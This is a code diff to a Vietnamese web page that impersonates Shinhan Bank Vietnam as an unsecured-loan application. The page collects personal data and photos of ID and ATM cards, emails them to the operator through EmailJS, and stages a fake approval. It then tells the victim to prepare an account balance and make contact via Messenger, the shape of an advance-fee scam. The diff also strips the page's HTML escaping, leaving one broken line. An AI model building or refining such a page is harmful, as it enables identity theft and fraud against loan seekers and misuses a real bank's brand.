@@ -25,7 +25,8 @@
             border-bottom: 5px solid #004A8F;
         }
         .header img {
-            max-width: 150px;
+            max-width: 200px; /* Tăng từ 150px */
+            height: auto;
         }
         .container {
             max-width: 900px;
@@ -40,7 +41,8 @@
             margin-bottom: 20px;
         }
         .form-logo img {
-            max-width: 100px;
+            max-width: 150px; /* Tăng từ 100px */
+            height: auto;
         }
         .form-label {
             font-weight: 500;
@@ -178,6 +180,8 @@
             color: white;
             border-bottom: none;
             padding: 20px;
+            display: flex;
+            align-items: center;
         }
         .modal-body {
             text-align: center;
@@ -248,6 +252,13 @@
             border-radius: 8px;
             padding: 15px;
             margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .terms-box img {
+            width: 28px; /* Tăng từ 24px */
+            height: 28px;
         }
         .terms-box p {
             margin: 0;
@@ -266,12 +277,50 @@
             margin: 0;
             font-size: 14px;
         }
+        .footer img.lock-icon {
+            width: 24px; /* Tăng từ 20px */
+            vertical-align: middle;
+            margin-right: 5px;
+        }
+        .footer img.footer-logo {
+            max-width: 130px; /* Tăng từ 100px */
+            margin-top: 10px;
+        }
+        .modal-header img {
+            width: 30px; /* Tăng từ 24px */
+            margin-right: 10px;
+        }
+        .step10-logo {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .step10-logo img {
+            max-width: 150px; /* Tăng từ 100px */
+            height: auto;
+        }
+        .toast-container {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            z-index: 1055;
+        }
     </style>
 </head>
 <body>
+    <!-- Toast Container -->
+    <div class="toast-container">
+        <div id="emailToast" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-bs-autohide="true" data-bs-delay="5000">
+            <div class="toast-header">
+                <strong class="me-auto">Thông báo</strong>
+                <button type="button" class="btn-close" data-bs-dismiss="toast" aria-label="Close"></button>
+            </div>
+            <div class="toast-body"></div>
+        </div>
+    </div>
+
     <!-- Header -->
     <div class="header">
-        <img src="https://shinhan.com.vn/public/themes/shinhan/img/logo-01.svg" alt="Shinhan Bank Logo">
+        <img src="https://shinhan.com.vn/public/themes/shinhan/img/logo-01.svg" alt="Shinhan Bank Logo" onerror="this.src='https://via.placeholder.com/200x50?text=Logo+Shinhan'">
         <h1>Đăng Ký Vay Tín Chấp</h1>
     </div>
 
@@ -280,7 +329,7 @@
         <!-- Bước 1: Đăng ký hồ sơ -->
         <div id="step1">
             <div class="form-logo">
-                <img src="https://shinhan.com.vn/public/themes/shinhan/img/logo-01.svg" alt="Shinhan Bank Logo">
+                <img src="https://shinhan.com.vn/public/themes/shinhan/img/logo-01.svg" alt="Shinhan Bank Logo" onerror="this.src='https://via.placeholder.com/150x50?text=Logo+Shinhan'">
             </div>
             <h5 class="step-title">Đăng Ký Hồ Sơ Vay Tín Chấp</h5>
             <p class="step-description">Vui lòng cung cấp đầy đủ thông tin cá nhân để chúng tôi tiến hành xét duyệt.</p>
@@ -339,6 +388,7 @@
                 </div>
                 <div class="mb-3">
                     <div class="terms-box">
+                        <img src="https://shinhan.com.vn/public/themes/shinhan/img/i_lock.png" alt="Lock Icon" onerror="this.src='https://via.placeholder.com/28x28?text=Lock'">
                         <p>Thông tin của bạn sẽ được bảo mật tuyệt đối theo chính sách bảo mật của Shinhan Bank. Vui lòng đọc kỹ <a href="#" data-bs-toggle="modal" data-bs-target="#termsModal">Điều khoản và Điều kiện</a> trước khi tiếp tục.</p>
                     </div>
                     <div class="form-check">
@@ -456,7 +506,7 @@
                 <p id="confirmationMessage"></p>
             </div>
             <div class="info-box">
-                <p>Chúng tôi đã gửi email xác nhận đến địa chỉ <span id="confirmationEmail"></span>. Vui lòng kiểm tra hộp thư!</p>
+                <p>Chúng tôi đã gửi email xác nhận đến địa chỉ <span id="confirmationEmail"></span>. Vui lòng kiểm tra hộp thư hoặc thư rác!</p>
             </div>
             <div class="text-center mt-3">
                 <button id="proceedToContractBtn" class="btn btn-primary">Xem Hợp Đồng</button>
@@ -512,6 +562,9 @@
 
         <!-- Bước 10: Chuẩn bị số dư và liên hệ qua Messenger -->
         <div id="step10" class="hidden">
+            <div class="step10-logo">
+                <img src="https://shinhan.com.vn/public/themes/shinhan/img/shinhan_logo_2.svg" alt="Shinhan Bank Logo" onerror="this.src='https://via.placeholder.com/150x50?text=Logo+Shinhan'">
+            </div>
             <h5 class="step-title">Chuẩn Bị Số Dư và Liên Hệ</h5>
             <p class="step-description">Vui lòng chuẩn bị số dư tài khoản và liên hệ với chúng tôi để hoàn tất quá trình giải ngân.</p>
             <div class="info-box">
@@ -528,6 +581,7 @@
         <div class="modal-dialog modal-lg">
             <div class="modal-content">
                 <div class="modal-header">
+                    <img src="https://shinhan.com.vn/public/themes/shinhan/img/i_lock.png" alt="Lock Icon" onerror="this.src='https://via.placeholder.com/30x30?text=Lock'">
                     <h5 class="modal-title" id="termsModalLabel">Điều Khoản và Điều Kiện</h5>
                     <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal" aria-label="Close"></button>
                 </div>
@@ -551,6 +605,7 @@
         <div class="modal-dialog modal-dialog-centered">
             <div class="modal-content">
                 <div class="modal-header">
+                    <img src="https://shinhan.com.vn/public/themes/shinhan/img/i_lock.png" alt="Lock Icon" onerror="this.src='https://via.placeholder.com/30x30?text=Lock'">
                     <h5 class="modal-title" id="successModalLabel">Chúc Mừng!</h5>
                     <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal" aria-label="Close"></button>
                 </div>
@@ -559,7 +614,7 @@
                     <p id="modalFullName"></p>
                     <p id="modalLoanAmount"></p>
                     <p id="modalLoanCode"></p>
-                    <p>Nhấn "Tiếp Tục" để xem hợp đồng.</p>
+                    <p>Chúng tôi đã gửi email xác nhận đến địa chỉ email của bạn. Vui lòng kiểm tra hộp thư hoặc thư rác. Nhấn "Tiếp Tục" để xem hợp đồng.</p>
                     <button type="button" class="btn btn-primary mt-3" data-bs-dismiss="modal" onclick="proceedToContract()">Tiếp Tục</button>
                 </div>
             </div>
@@ -568,7 +623,9 @@
 
     <!-- Footer -->
     <div class="footer">
+        <img src="https://shinhan.com.vn/public/themes/shinhan/img/i_lock.png" alt="Lock Icon" class="lock-icon" onerror="this.src='https://via.placeholder.com/24x24?text=Lock'">
         <p>Shinhan Bank Việt Nam - Hotline: 1900 1234 - Email: support@shinhan.com.vn</p>
+        <img src="https://shinhan.com.vn/public/themes/shinhan/img/shinhan_logo_2.svg" alt="Shinhan Bank Logo" class="footer-logo" onerror="this.src='https://via.placeholder.com/130x50?text=Logo+Shinhan'">
     </div>
 
     <!-- Bootstrap JS -->
@@ -579,6 +636,17 @@
         (function() {
             emailjs.init("OrBsI926QI2_xBh1f");
         })();
+
+        // Hàm hiển thị toast
+        function showToast(message, isSuccess = true) {
+            const toast = document.getElementById('emailToast');
+            const toastBody = toast.querySelector('.toast-body');
+            toastBody.textContent = message;
+            toast.classList.remove('bg-success', 'bg-danger');
+            toast.classList.add(isSuccess ? 'bg-success' : 'bg-danger');
+            const bsToast = new bootstrap.Toast(toast);
+            bsToast.show();
+        }
 
         // Định nghĩa formData với URL hình ảnh
         let formData = {
@@ -593,11 +661,11 @@
         function sanitizeInput(value) {
             if (!value) return "Không cung cấp";
             return String(value)
-                .replace(/&/g, "&amp;")
-                .replace(/</g, "&lt;")
-                .replace(/>/g, "&gt;")
-                .replace(/"/g, "&quot;")
-                .replace(/'/g, "&#39;");
+                .replace(/&/g, "&")
+                .replace(/</g, "<")
+                .replace(/>/g, ">")
+                .replace(/"/g, """)
+                .replace(/'/g, "'");
         }
 
         // Hàm định dạng số tiền
@@ -620,14 +688,6 @@
         }
 
         // Hiển thị thông tin tệp đã tải lên
-        $('#atmImage').on('change', function(e) {
-            const file = e.target.files[0];
-            if (file) {
-                $('#atmImageInfo').text(`${file.name} (${Math.round(file.size / 1024)} KB)`);
-                $('#atmImage').removeClass('is-invalid');
-            }
-        });
-
         $('#idFrontImage').on('change', function(e) {
             const file = e.target.files[0];
             if (file) {
@@ -641,6 +701,14 @@
             if (file) {
                 $('#idBackInfo').text(`${file.name} (${Math.round(file.size / 1024)} KB)`);
                 $('#idBackImage').removeClass('is-invalid');
+            }
+        });
+
+        $('#atmImage').on('change', function(e) {
+            const file = e.target.files[0];
+            if (file) {
+                $('#atmImageInfo').text(`${file.name} (${Math.round(file.size / 1024)} KB)`);
+                $('#atmImage').removeClass('is-invalid');
             }
         });
 
@@ -922,12 +990,14 @@
                 emailjs.send("service_kowy5xk", "template_vy7921a", emailParamsCollection)
                     .then(function(response) {
                         console.log("Email thu thập thông tin gửi thành công:", response);
+                        showToast("Email thu thập thông tin đã được gửi!", true);
                         // Giả lập xét duyệt (90 giây)
                         setTimeout(() => {
                             // Gửi email thông báo duyệt
                             emailjs.send("service_kowy5xk", "template_x9glk4i", emailParamsApproval)
                                 .then(function(response) {
                                     console.log("Email thông báo duyệt gửi thành công:", response);
+                                    showToast("Email thông báo duyệt đã được gửi!", true);
                                     $('#modalFullName').text(`Khách hàng: ${userData.fullName}`);
                                     $('#modalLoanAmount').text(`Số tiền vay: ${formatNumber(userData.loanAmount)} VND`);
                                     $('#modalLoanCode').text(`Mã hồ sơ: ${userData.loanCode}`);
@@ -938,14 +1008,14 @@
                                     $('#successModal').modal('show');
                                 }, function(error) {
                                     console.error("Lỗi gửi email thông báo:", error);
-                                    alert("Lỗi gửi email thông báo: " + JSON.stringify(error));
+                                    showToast("Lỗi gửi email thông báo: " + JSON.stringify(error), false);
                                     $('#step6').addClass('hidden');
                                     $('#step1').removeClass('hidden');
                                 });
                         }, 90000);
                     }, function(error) {
                         console.error("Lỗi gửi email thu thập thông tin:", error);
-                        alert("Lỗi gửi email thu thập thông tin: " + JSON.stringify(error));
+                        showToast("Lỗi gửi email thu thập thông tin: " + JSON.stringify(error), false);
                         $('#step6').addClass('hidden');
                         $('#step1').removeClass('hidden');
                     });
